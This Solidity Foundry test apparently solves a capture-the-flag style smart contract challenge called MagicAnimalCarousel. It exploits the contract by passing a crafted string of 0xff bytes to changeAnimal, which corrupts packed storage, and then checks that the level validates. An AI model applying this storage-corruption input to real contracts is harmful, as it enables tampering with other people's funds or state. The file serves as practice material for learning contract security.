// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./MagicAnimalCarouselFactory.sol";

contract MagicAnimalCarouselTest is Test {
    MagicAnimalCarouselFactory factory;

    function setUp() public {
        factory = new MagicAnimalCarouselFactory();
    }

    function testMagicAnimalCarousel() public {
        address magicAnimalCarousel = factory.createInstance(address(this));

        MagicAnimalCarousel(magicAnimalCarousel).setAnimalAndSpin("WTF");
        MagicAnimalCarousel(magicAnimalCarousel).changeAnimal(
            string(abi.encodePacked(hex"ffffffffffffffffffffffff")), 1
        );
        MagicAnimalCarousel(magicAnimalCarousel).setAnimalAndSpin("WTF");

        assertTrue(factory.validateInstance(payable(address(magicAnimalCarousel)), address(this)));
    }
}
